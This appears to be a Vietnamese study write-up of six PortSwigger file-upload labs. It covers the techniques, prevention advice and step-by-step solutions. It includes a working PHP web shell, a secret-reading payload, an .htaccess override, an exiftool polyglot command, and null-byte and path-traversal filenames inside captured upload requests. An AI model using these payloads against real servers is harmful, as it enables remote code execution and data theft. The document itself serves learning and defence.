# File Upload (6 labs)

Định nghĩa: chức năng upload không kiểm tra kỹ tên, nội dung, định dạng hoặc kích thước của file, từ một chức năng đơn giản như upload ảnh cũng có thể dẫn đến:

- Tải lên và thực thi mã độc (webshell).
- Ghi đè file quan trọng của hệ thống.
- Lấp đầy ổ đĩa (tấn công DoS) 

Nguyên nhân: lỗ hổng xảy ra khi ứng dụng cho phép người dùng tải file lên mà không kiểm soát chặt về:

- Định dạng (extension)
- Loại nội dung (MIME type)
- Vị trí lưu trữ file
- Quyền thực thi của file

Tác động: Nếu file độc hại được thực thi trên server, attacker có thể:

- Đọc / ghi file
- Chạy lệnh hệ thống
- Chiếm toàn bộ quyền điều khiển máy chủ

Kỹ thuật khai thác phổ biến: 

1. **Unrestricted File Upload**

Cho upload file `.php` bình thường, nội dung chứa shell:

```php+HTML
<?php echo system($_GET['cmd']); ?>
```

→ Truy cập URL file để thực thi lệnh.

------

2. **Extension blacklist bypass**

Server cấm `.php`, nhưng không cấm `.php5`, `.pHp`, `.asp;.jpg`
 → Upload file với đuôi lạ mà server vẫn thực thi được.

Vì Apache/nginx có thể cấu hình thực thi nhiều phần mở rộng liên quan đến PHP.

------

3. **Null byte injection**

Đổi tên file:

```
exploit.php%00.jpg
```

→ `%00` là ký tự kết thúc chuỗi trong C, khiến hệ thống chỉ thấy `.php`

Một số ngôn ngữ back-end bị ảnh hưởng nếu dùng C-style string handling.

------

### 4. **Content-Type or Magic Bytes Bypass**

- Khai báo `Content-Type: image/jpeg`, nhưng thực tế là file PHP.
- Hoặc dùng đầu file chứa magic bytes đúng của ảnh `.jpg`, phần sau là mã PHP.

**Phân tích**: Server chỉ kiểm tra sơ sài loại file dựa trên header hoặc magic bytes.

------

5. **.htaccess override**

Upload `.htaccess` chứa:

```bash
AddType application/x-httpd-php .l33t
```

→ Server sẽ xử lý `.l33t` như PHP → Upload file `exploit.l33t`

Apache cho phép gán MIME mới theo extension nếu `.htaccess` được phép.

------

6. **Polyglot file**

Dùng `ExifTool` chèn mã PHP vào ảnh thật:

```cmd
exiftool -Comment="<?php ... ?>" photo.jpg -o shell.php
```

→ Server thấy là ảnh, nhưng khi truy cập shell.php thì mã PHP được thực thi.

------

7. **Path Traversal**

Đổi tên file thành:

```
filename="../shell.php"
```

→ File ghi ra thư mục cha (`/files/`), nơi có thể truy cập được từ URL.

Nếu server không kiểm tra và lọc `../`, attacker có thể điều khiển vị trí lưu file.

Prevention: 

- Whitelist đuôi file an toàn (chỉ cho phép `.jpg`, `.png`, v.v.).
- Kiểm tra nội dung file thực sự (magic bytes), không chỉ MIME hay đuôi.
- Đổi tên file thành ngẫu nhiên, không dùng tên người dùng upload.
- Lưu file vào thư mục không thực thi được (no-execute).
- Cấm .htaccess hoặc vô hiệu hóa override trong cấu hình Apache.
- Giới hạn kích thước file, loại bỏ metadata độc hại.

Common Payload:



## Apprentice

### [Lab 1: Remote code execution via web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)

Lab des: 

Lợi dụng chức năng upload ảnh đại diện (avatar) để tải lên một web shell PHP, thực thi mã từ xa và đọc nội dung file bí mật: `/home/carlos/secret`

Steps: 

- Test chức năng upload ảnh: 

  ![image-20250604033238116](./image/image-20250604033238116.png)

- craft file `exploit.py`: `<?php echo file_get_contents('/home/carlos/secret'); ?>`

  => upload avt = file php 

  Send req to burp repeater, gửi req, response trả về sẽ là nột dung file secret cần tìm.

![image-20250604033640351](./image/image-20250604033640351.png)

![image-20250604033721405](./image/image-20250604033721405.png)



### [Lab 2: Web shell upload via Content-Type restriction bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass)

Lab des: 

Bypass kiểm tra loại file bằng cách giả mạo MIME type, upload web shell PHP, rồi dùng nó để đọc `/home/carlos/secret`.

Steps: 

- thử upload file `exploit.php` => fail

  ```html
  POST /my-account/avatar HTTP/2
  Host: 0a1000d503b0da6a83163dde00600082.web-security-academy.net
  Cookie: session=xMbzLeO65tX5gNhSl4hoRExqfXhIrnTg
  
  // redacted info
  
  Referer: https://0a1000d503b0da6a83163dde00600082.web-security-academy.net/my-account?id=wiener
  Accept-Encoding: gzip, deflate, br
  Accept-Language: en-US,en;q=0.9
  Priority: u=0, i
  
  ------WebKitFormBoundaryht1QVIp1MjDRXZEl
  Content-Disposition: form-data; name="avatar"; filename="exploit.php"
  Content-Type: application/octet-stream
  
  <?php echo file_get_contents('/home/carlos/secret'); ?>
  ------WebKitFormBoundaryht1QVIp1MjDRXZEl
  Content-Disposition: form-data; name="user"
  
  wiener
  ------WebKitFormBoundaryht1QVIp1MjDRXZEl
  Content-Disposition: form-data; name="csrf"
  
  KCYwsgx1yoZgazPhaGICo9CM42wtFWfj
  ------WebKitFormBoundaryht1QVIp1MjDRXZEl--
  
  ```

  Thay dòng `COntent-Type` = 

  ```
  Content-Type: image/jpeg
  ```

  ![image-20250604035332575](./image/image-20250604035332575.png)

=> upload oke

![image-20250604035443300](./image/image-20250604035443300.png)

- submit the solution `Q5lUXaP3ySGQFSMz0hDRCQ9pQ8UC85rq`=> solve the lab

![image-20250604035534846](./image/image-20250604035534846.png)

## Practitioner

### [Lab 1: Web shell upload via path traversal](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)

Lab des: 

Bypass việc ngăn thực thi file upload bằng cách (sử dụng path traversal) di chuyển file ra khỏi thư mục `/avatars/`, nơi không được thực thi, để đưa nó lên thư mục `/files/` có thể thực thi PHP.

Khi upload file exploit.php, trình duyệt k chặn, nhưng cũng k cho phép thực thi mà chỉ hiển thị nội dung là plain text:

![image-20250604040915496](./image/image-20250604040915496.png)

Steps:

![image-20250604041125062](./image/image-20250604041125062.png)

Chỉnh sửa phần `filename` trong trường `Content-Disposition` thành `..%2fexploit.php` (url encode của chuỗi traversal 1 lần)

=> send req

![image-20250604041310095](./image/image-20250604041310095.png)

![image-20250604041339151](./image/image-20250604041339151.png)

H file exploit.php được up lên và nằm ở thư mục /files/, chỉnh sửa req GET để xem ở đó file exploit có được thực thi không:

![image-20250604041527481](./image/image-20250604041527481.png)

=> `H8FDxN2dSVgcQVsl1aRRnWpT1152c6dk` 

![image-20250604041602475](./image/image-20250604041602475.png)



### [Lab 2: Web shell upload via extension blacklist bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass)

Lab des: 

- Lab có một tính năng **upload ảnh đại diện (avatar)**.

- **Một số đuôi file (extensions)** như `.php` bị **blacklist** nên không thể upload file chứa mã độc trực tiếp.

  ![image-20250606000234083](./image/image-20250606000234083.png)

- Tuy nhiên, **blacklist này có lỗi**, cho phép ta **bypass bảo mật** để upload và thực thi một **web shell PHP**.



Steps: 

- File `.htaccess` là một **tập tin cấu hình** đặc biệt được sử dụng bởi máy chủ web **Apache**, cho phép **tùy chỉnh cách hoạt động của máy chủ web** đối với thư mục nơi file `.htaccess` được đặt (và các thư mục con nếu không bị ghi đè). Chỉnh sửa req để upload file .htaccess có nội dung như sau:

![image-20250606001118803](./image/image-20250606001118803.png)

=> cho phép xử lý (thực thi) file .l33t như file php:

![image-20250606001630356](./image/image-20250606001630356.png)

=> gửi request để thực thi file l33t đã up lên

![image-20250606001656332](./image/image-20250606001656332.png)

=> get secret

`YDERjrbgsw1GF2NwTe7lEYP7asNJE8KG`

![image-20250606001738344](./image/image-20250606001738344.png)



### [Lab 3: Web shell upload via obfuscated file extension](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension)



lab des: 

Trang web có chức năng tải ảnh đại diện (avatar), nhưng có **blacklist** các phần mở rộng tệp (ví dụ: `.php`). Tuy nhiên, có thể **vượt qua bằng kỹ thuật null byte injection**

![image-20250607042857708](./image/image-20250607042857708.png)

steps: 

- capture POST /my-account/avatar và chỉnh sửa req: 

  ![image-20250607043223287](./image/image-20250607043223287.png)

  => response:

  ![image-20250607043301131](./image/image-20250607043301131.png)

  ![image-20250607043537502](./image/image-20250607043537502.png)

`GET /files/avatars/exploit.php HTTP/2`

![image-20250607043748139](./image/image-20250607043748139.png)

`exploit.php%00.jpg` sẽ được các trình xử lý chuỗi hiểu `exploit.php` và bypass được blacklist extension.

`NnXwRJSLOK96YTkicLSlprBQFVQoiHS7`

![image-20250607043953263](./image/image-20250607043953263.png)



### [Lab 4: Remote code execution via polyglot web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload)

Lab des: 

Ứng dụng web có chức năng tải ảnh đại diện (avatar), và có **kiểm tra nội dung tệp** để xác định có phải ảnh thật không (dựa trên định dạng và metadata).

![image-20250607045630433](./image/image-20250607045630433.png)

=> Tải một file **JPG/PHP polyglot** lên máy chủ để thực thi PHP code, từ đó **đọc nội dung file `/home/carlos/secret`**.

Steps: 

- Tạo file polyglot = `exiftool`

  ![image-20250607050223008](./image/image-20250607050223008.png)

  ![image-20250607051931162](./image/image-20250607051931162.png)

- Up file polyglot lên server và tìm chuỗi secret trả về: 

![image-20250612132227428](./image/image-20250612132227428.png)

![image-20250612132708830](./image/image-20250612132708830.png)

![image-20250612132739726](./image/image-20250612132739726.png)

